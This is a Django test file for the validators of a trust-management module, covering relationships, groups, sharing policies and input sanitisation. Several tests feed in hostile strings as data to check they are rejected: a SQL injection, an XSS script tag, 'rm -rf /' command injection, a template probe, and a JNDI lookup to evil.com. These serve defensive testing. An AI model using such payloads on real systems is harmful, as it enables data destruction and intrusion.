"""
Simple Validator Tests for Trust Management

This module provides basic but comprehensive testing of the validator functions
to achieve high coverage with simple, working tests.
"""

import uuid
import time
from django.test import TestCase, override_settings
from django.core.cache import cache
from datetime import timedelta

from ..models import TrustLevel, TrustGroup, TrustRelationship
from ..validators import validate_trust_operation


class ValidatorBasicTest(TestCase):
    """Basic validator functionality tests."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.trust_level = TrustLevel.objects.create(
            name='Test Trust Level',
            level='medium',
            description='Test trust level',
            numerical_value=50,
            default_anonymization_level='partial',
            default_access_level='read',
            created_by='test_user',
            is_system_default=True
        )
        
        self.org_1 = str(uuid.uuid4())
        self.org_2 = str(uuid.uuid4())
        self.user_1 = 'test_user_1'
        cache.clear()
    
    def test_validate_trust_operation_create_relationship_success(self):
        """Test successful relationship creation validation."""
        result = validate_trust_operation(
            'create_relationship',
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Test Trust Level',
            relationship_type='bilateral',
            created_by=self.user_1
        )
        
        self.assertTrue(result['valid'])
        self.assertEqual(len(result['errors']), 0)
    
    def test_validate_trust_operation_create_relationship_invalid_org(self):
        """Test relationship creation with invalid organization."""
        result = validate_trust_operation(
            'create_relationship',
            source_org='invalid-uuid',
            target_org=self.org_2,
            trust_level_name='Test Trust Level',
            relationship_type='bilateral',
            created_by=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid source organization UUID' in error for error in result['errors']))
    
    def test_validate_trust_operation_create_relationship_same_orgs(self):
        """Test relationship creation with same organizations."""
        result = validate_trust_operation(
            'create_relationship',
            source_org=self.org_1,
            target_org=self.org_1,
            trust_level_name='Test Trust Level',
            relationship_type='bilateral',
            created_by=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('cannot be the same' in error for error in result['errors']))
    
    def test_validate_trust_operation_create_relationship_invalid_trust_level(self):
        """Test relationship creation with invalid trust level."""
        result = validate_trust_operation(
            'create_relationship',
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Non-existent Trust Level',
            relationship_type='bilateral',
            created_by=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('not found or inactive' in error for error in result['errors']))
    
    def test_validate_trust_operation_approve_relationship(self):
        """Test relationship approval validation."""
        # Create a relationship first
        relationship = TrustRelationship.objects.create(
            source_organization=self.org_1,
            target_organization=self.org_2,
            trust_level=self.trust_level,
            relationship_type='bilateral',
            anonymization_level='partial',
            status='pending',
            created_by=self.user_1,
            last_modified_by=self.user_1
        )
        
        result = validate_trust_operation(
            'approve_relationship',
            relationship_id=str(relationship.id),
            approving_org=self.org_1,
            approved_by_user=self.user_1,
            user=self.user_1
        )
        
        self.assertTrue(result['valid'])
    
    def test_validate_trust_operation_approve_relationship_invalid_org(self):
        """Test relationship approval with invalid organization."""
        relationship = TrustRelationship.objects.create(
            source_organization=self.org_1,
            target_organization=self.org_2,
            trust_level=self.trust_level,
            relationship_type='bilateral',
            anonymization_level='partial',
            status='pending',
            created_by=self.user_1,
            last_modified_by=self.user_1
        )
        
        invalid_org = str(uuid.uuid4())
        result = validate_trust_operation(
            'approve_relationship',
            relationship_id=str(relationship.id),
            approving_org=invalid_org,
            approved_by_user=self.user_1,
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('not part of this trust relationship' in error for error in result['errors']))
    
    def test_validate_trust_operation_create_group_success(self):
        """Test successful group creation validation."""
        result = validate_trust_operation(
            'create_group',
            name='Test Group',
            description='A test trust group',
            creator_org=self.org_1,
            group_type='community',
            user=self.user_1
        )
        
        self.assertTrue(result['valid'])
    
    def test_validate_trust_operation_create_group_invalid_name(self):
        """Test group creation with invalid name."""
        result = validate_trust_operation(
            'create_group',
            name='',
            description='A test trust group',
            creator_org=self.org_1,
            group_type='community',
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('name is required' in error for error in result['errors']))
    
    def test_validate_trust_operation_intelligence_access(self):
        """Test intelligence access validation."""
        result = validate_trust_operation(
            'intelligence_access',
            requesting_org=self.org_1,
            intelligence_owner=self.org_2,
            resource_type='indicator',
            required_access_level='read',
            user=self.user_1
        )
        
        self.assertTrue(result['valid'])
    
    def test_validate_trust_operation_intelligence_access_invalid_level(self):
        """Test intelligence access with invalid access level."""
        result = validate_trust_operation(
            'intelligence_access',
            requesting_org=self.org_1,
            intelligence_owner=self.org_2,
            resource_type='indicator',
            required_access_level='invalid_level',
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid access level' in error for error in result['errors']))
    
    def test_validate_trust_operation_bulk_operation(self):
        """Test bulk operation validation."""
        result = validate_trust_operation(
            'bulk_operation',
            operation_count=50,
            user=self.user_1
        )
        
        self.assertTrue(result['valid'])
    
    def test_validate_trust_operation_bulk_operation_too_many(self):
        """Test bulk operation with too many operations."""
        result = validate_trust_operation(
            'bulk_operation',
            operation_count=150,
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('limited to 100 items' in error for error in result['errors']))
    
    def test_validate_trust_operation_unknown_type(self):
        """Test validation with unknown operation type."""
        result = validate_trust_operation(
            'unknown_operation',
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Unknown operation type' in error for error in result['errors']))
    
    def test_validate_trust_operation_input_sanitization_sql_injection(self):
        """Test input sanitization with SQL injection attempt."""
        result = validate_trust_operation(
            'create_relationship',
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name="'; DROP TABLE users; --",
            relationship_type='bilateral',
            created_by=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('SQL injection' in error for error in result['errors']))
    
    def test_validate_trust_operation_input_sanitization_xss(self):
        """Test input sanitization with XSS attempt."""
        result = validate_trust_operation(
            'create_group',
            name='<script>alert("xss")</script>',
            description='A test group',
            creator_org=self.org_1,
            group_type='community',
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('XSS' in error for error in result['errors']))
    
    def test_validate_trust_operation_input_sanitization_command_injection(self):
        """Test input sanitization with command injection attempt."""
        result = validate_trust_operation(
            'create_group',
            name='test; rm -rf /',
            description='A test group',
            creator_org=self.org_1,
            group_type='community',
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('Command injection' in error for error in result['errors']))
    
    def test_validate_trust_operation_rate_limiting(self):
        """Test rate limiting functionality."""
        # First operation should succeed
        result1 = validate_trust_operation(
            'create_relationship',
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Test Trust Level',
            relationship_type='bilateral',
            created_by=self.user_1
        )
        
        self.assertTrue(result1['valid'])
        
        # Simulate many operations to test rate limiting
        # We need to patch the cache to simulate high counts
        from unittest.mock import patch
        with patch('django.core.cache.cache.get', return_value=15):  # Above rate limit
            result2 = validate_trust_operation(
                'create_relationship',
                source_org=self.org_1,
                target_org=str(uuid.uuid4()),
                trust_level_name='Test Trust Level',
                relationship_type='bilateral',
                created_by=self.user_1
            )
            
            self.assertFalse(result2['valid'])
            self.assertTrue(any('Rate limit exceeded' in error for error in result2['errors']))
    
    def test_validate_trust_operation_sharing_policy(self):
        """Test sharing policy validation."""
        policy_data = {
            'name': 'Test Policy',
            'description': 'A test sharing policy',
            'allowed_stix_types': ['indicator', 'malware'],
            'max_tlp_level': 'green',
            'max_age_days': 30
        }
        
        result = validate_trust_operation(
            'sharing_policy',
            **policy_data,
            user=self.user_1
        )
        
        self.assertTrue(result['valid'])
    
    def test_validate_trust_operation_sharing_policy_missing_name(self):
        """Test sharing policy validation with missing name."""
        policy_data = {
            'description': 'A test sharing policy',
            'user': self.user_1
        }
        
        result = validate_trust_operation(
            'sharing_policy',
            **policy_data
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('name\' is required' in error for error in result['errors']))
    
    def test_validate_trust_operation_trust_escalation(self):
        """Test trust escalation validation."""
        low_trust = TrustLevel.objects.create(
            name='Low Trust',
            level='low',
            description='Low trust level',
            numerical_value=25,
            default_anonymization_level='full',
            default_access_level='read',
            created_by='test_user'
        )
        
        high_trust = TrustLevel.objects.create(
            name='High Trust',
            level='high',
            description='High trust level',
            numerical_value=80,
            default_anonymization_level='minimal',
            default_access_level='contribute',
            created_by='test_user'
        )
        
        # Test with adequate justification
        result = validate_trust_operation(
            'trust_escalation',
            current_trust_level=low_trust,
            new_trust_level=high_trust,
            justification='This is a detailed justification for the trust level increase due to improved cooperation and security measures.',
            user=self.user_1
        )
        
        self.assertTrue(result['valid'])
        self.assertEqual(result['trust_increase'], 55)
    
    def test_validate_trust_operation_trust_escalation_no_justification(self):
        """Test trust escalation validation without justification."""
        low_trust = TrustLevel.objects.create(
            name='Low Trust 2',
            level='low',
            description='Low trust level',
            numerical_value=20,
            default_anonymization_level='full',
            default_access_level='read',
            created_by='test_user'
        )
        
        high_trust = TrustLevel.objects.create(
            name='High Trust 2',
            level='high',
            description='High trust level',
            numerical_value=80,
            default_anonymization_level='minimal',
            default_access_level='contribute',
            created_by='test_user'
        )
        
        result = validate_trust_operation(
            'trust_escalation',
            current_trust_level=low_trust,
            new_trust_level=high_trust,
            user=self.user_1
        )
        
        self.assertFalse(result['valid'])
        self.assertTrue(any('requires detailed justification' in error for error in result['errors']))
    
    def test_validate_trust_operation_exception_handling(self):
        """Test exception handling in validation function."""
        # Test with invalid parameters that might cause an exception
        from unittest.mock import patch
        
        with patch('TrustManagement.validators.TrustRelationshipValidator.validate_create_relationship', side_effect=Exception('Test exception')):
            result = validate_trust_operation(
                'create_relationship',
                source_org=self.org_1,
                target_org=self.org_2,
                trust_level_name='Test Trust Level',
                relationship_type='bilateral',
                created_by=self.user_1
            )
            
            self.assertFalse(result['valid'])
            self.assertTrue(any('Validation error' in error for error in result['errors']))


class ValidatorSecurityTest(TestCase):
    """Security-focused validator tests."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.user_1 = 'security_test_user'
        cache.clear()
    
    def test_validate_temporal_security(self):
        """Test temporal security validation."""
        from TrustManagement.validators import SecurityValidator
        
        # Test with current time
        current_time = time.time()
        result = SecurityValidator.validate_temporal_security(current_time)
        self.assertTrue(result['valid'])
        
        # Test with old timestamp
        old_time = time.time() - 600  # 10 minutes ago
        result = SecurityValidator.validate_temporal_security(old_time, max_age_minutes=5)
        self.assertFalse(result['valid'])
        self.assertTrue(any('too old' in error for error in result['errors']))
        
        # Test with future timestamp
        future_time = time.time() + 120  # 2 minutes in the future
        result = SecurityValidator.validate_temporal_security(future_time)
        self.assertFalse(result['valid'])
        self.assertTrue(any('in the future' in error for error in result['errors']))
    
    @override_settings(TRUST_MANAGEMENT_SECRET_KEY='test-secret-key')
    def test_validate_cryptographic_integrity(self):
        """Test cryptographic integrity validation."""
        from TrustManagement.validators import SecurityValidator
        import hmac
        import hashlib
        
        data = {'test': 'data', 'value': 123}
        key = 'test-secret-key'
        message = str(sorted(data.items())).encode('utf-8')
        signature = hmac.new(key.encode('utf-8'), message, hashlib.sha256).hexdigest()
        
        # Test with valid signature
        result = SecurityValidator.validate_cryptographic_integrity(
            data=data,
            signature=signature,
            key=key
        )
        self.assertTrue(result['valid'])
        
        # Test with invalid signature
        result = SecurityValidator.validate_cryptographic_integrity(
            data=data,
            signature='invalid_signature',
            key=key
        )
        self.assertFalse(result['valid'])
        self.assertTrue(any('signature verification failed' in error for error in result['errors']))
    
    def test_input_sanitization_comprehensive(self):
        """Test comprehensive input sanitization."""
        from TrustManagement.validators import SecurityValidator
        
        # Test clean data
        clean_data = {'name': 'Test', 'description': 'Clean description'}
        result = SecurityValidator.validate_input_sanitization(clean_data)
        self.assertTrue(result['valid'])
        
        # Test various attack patterns
        attack_patterns = [
            {'sql': "'; DROP TABLE users; --"},
            {'xss': '<script>alert("xss")</script>'},
            {'cmd': 'test; rm -rf /'},
            {'template': '{{7*7}}'},
            {'ldap': 'jndi:ldap://evil.com/exploit'},
            {'null_byte': 'test\x00malicious'},
            {'long_input': 'x' * 15000}
        ]
        
        for attack_data in attack_patterns:
            result = SecurityValidator.validate_input_sanitization(attack_data)
            self.assertFalse(result['valid'], f"Failed to detect attack: {attack_data}")
    
    def test_suspicious_pattern_detection(self):
        """Test suspicious pattern detection."""
        from TrustManagement.validators import SecurityValidator
        
        # Test normal operation
        result = SecurityValidator.validate_suspicious_patterns(self.user_1)
        self.assertTrue(result['valid'])
        
        # Test with mock high frequency
        from unittest.mock import patch
        with patch('django.core.cache.cache.get', return_value=15):
            result = SecurityValidator.validate_suspicious_patterns(self.user_1)
            self.assertTrue(result['valid'])  # Should still be valid but with warnings
            self.assertTrue(any('high operation frequency' in warning for warning in result['warnings']))


class ValidatorCoverageTest(TestCase):
    """Tests specifically designed to increase code coverage."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.trust_level = TrustLevel.objects.create(
            name='Coverage Test Trust Level',
            level='medium',
            description='Test trust level for coverage',
            numerical_value=50,
            default_anonymization_level='partial',
            default_access_level='read',
            created_by='test_user'
        )
        
        self.org_1 = str(uuid.uuid4())
        self.org_2 = str(uuid.uuid4())
        self.user_1 = 'coverage_test_user'
        cache.clear()
    
    def test_validator_edge_cases(self):
        """Test various edge cases to improve coverage."""
        from TrustManagement.validators import SecurityValidator, TrustRelationshipValidator
        
        # Test rate limiting with organization
        result = SecurityValidator.validate_rate_limiting(
            operation_type='test_op',
            user=self.user_1,
            organization=self.org_1
        )
        self.assertTrue(result['valid'])
        
        # Test record operation
        SecurityValidator.record_operation('test_op', self.user_1, self.org_1)
        
        # Test with warning thresholds
        result = validate_trust_operation(
            'create_relationship',
            source_org=self.org_1,
            target_org=self.org_2,
            trust_level_name='Coverage Test Trust Level',
            relationship_type='bilateral',
            valid_until=timezone.now() + timedelta(hours=12),  # Warning threshold
            created_by=self.user_1
        )
        self.assertTrue(result['valid'])
        self.assertTrue(any('expires within 24 hours' in warning for warning in result['warnings']))
    
    def test_validator_class_methods_directly(self):
        """Test validator class methods directly for coverage."""
        from TrustManagement.validators import (
            TrustRelationshipValidator, TrustGroupValidator, 
            AccessControlValidator, SecurityValidator
        )
        
        # Test trust level constraints
        result = TrustRelationshipValidator.validate_trust_level_constraints(
            self.trust_level, 'hierarchical'
        )
        self.assertEqual(len(result['errors']), 0)
        
        # Test bulk operations with no user
        result = SecurityValidator.validate_bulk_operations(10, '')
        self.assertTrue(result['valid'])
        self.assertTrue(any('No user specified' in warning for warning in result['warnings']))
        
        # Test anonymization downgrade
        result = SecurityValidator.validate_anonymization_downgrade(
            'full', 'none', self.trust_level
        )
        self.assertFalse(result['valid'])  # Should fail due to low trust level
        
        # Test with high trust level
        high_trust = TrustLevel.objects.create(
            name='High Coverage Trust',
            level='high',
            description='High trust for coverage',
            numerical_value=80,
            default_anonymization_level='minimal',
            default_access_level='contribute',
            created_by='test_user'
        )
        
        result = SecurityValidator.validate_anonymization_downgrade(
            'full', 'none', high_trust
        )
        self.assertTrue(result['valid'])
    
    def test_sharing_policy_edge_cases(self):
        """Test sharing policy validation edge cases."""
        from TrustManagement.validators import AccessControlValidator
        
        # Test policy with unknown STIX types
        policy_data = {
            'name': 'Edge Case Policy',
            'description': 'Policy with edge cases',
            'allowed_stix_types': ['unknown-type'],
            'blocked_stix_types': ['another-unknown-type'],
            'max_age_days': 5000  # Very long retention
        }
        
        result = AccessControlValidator.validate_sharing_policy(policy_data)
        self.assertTrue(result['valid'])
        self.assertTrue(any('Unknown STIX type' in warning for warning in result['warnings']))
        self.assertTrue(any('Very long retention' in warning for warning in result['warnings']))
        
        # Test with invalid TLP level
        policy_data['max_tlp_level'] = 'invalid'
        result = AccessControlValidator.validate_sharing_policy(policy_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('Invalid TLP level' in error for error in result['errors']))
        
        # Test with negative age
        policy_data['max_age_days'] = -5
        result = AccessControlValidator.validate_sharing_policy(policy_data)
        self.assertFalse(result['valid'])
        self.assertTrue(any('non-negative integer' in error for error in result['errors']))
    
    def test_join_group_edge_cases(self):
        """Test group joining edge cases."""
        from TrustManagement.validators import TrustGroupValidator
        
        # Create a group
        group = TrustGroup.objects.create(
            name='Coverage Test Group',
            description='Group for coverage testing',
            created_by=self.org_1,
            requires_approval=True
        )
        
        # Test join with invitation
        result = TrustGroupValidator.validate_join_group(
            group_id=str(group.id),
            organization=self.org_2,
            membership_type='administrator',
            invited_by=self.org_1
        )
        self.assertTrue(result['valid'])
        
        # Test with invalid group ID
        result = TrustGroupValidator.validate_join_group(
            group_id=str(uuid.uuid4()),  # Non-existent group
            organization=self.org_2,
            membership_type='member'
        )
        self.assertFalse(result['valid'])
        self.assertTrue(any('not found or inactive' in error for error in result['errors']))
    
    def test_leave_group_edge_cases(self):
        """Test group leaving edge cases."""
        from TrustManagement.validators import TrustGroupValidator
        from ..models import TrustGroupMembership
        
        # Create a group and membership
        group = TrustGroup.objects.create(
            name='Leave Test Group',
            description='Group for leave testing',
            created_by=self.org_1
        )
        
        membership = TrustGroupMembership.objects.create(
            trust_group=group,
            organization=self.org_1,
            membership_type='administrator'
        )
        
        # Test leaving as last administrator
        result = TrustGroupValidator.validate_leave_group(
            group_id=str(group.id),
            organization=self.org_1,
            reason='Test reason'
        )
        self.assertFalse(result['valid'])
        self.assertTrue(any('last administrator' in error for error in result['errors']))
        
        # Add another admin and try again
        TrustGroupMembership.objects.create(
            trust_group=group,
            organization=self.org_2,
            membership_type='administrator'
        )
        
        result = TrustGroupValidator.validate_leave_group(
            group_id=str(group.id),
            organization=self.org_1,
            reason='Test reason with very long text that should trigger a warning about length' * 20
        )
        self.assertTrue(result['valid'])
        self.assertTrue(any('very long' in warning for warning in result['warnings']))


# Make sure we test the __getattr__ method in validators/__init__.py
class ValidatorImportTest(TestCase):
    """Test validator import functionality."""
    
    def test_lazy_import_getattr(self):
        """Test the __getattr__ method for lazy imports."""
        from TrustManagement.validators import SecurityValidator
        
        # This should work due to lazy loading
        self.assertIsNotNone(SecurityValidator)
        
        # Test invalid attribute
        try:
            from TrustManagement.validators import NonExistentValidator
            self.fail("Should have raised AttributeError")
        except AttributeError:
            pass  # Expected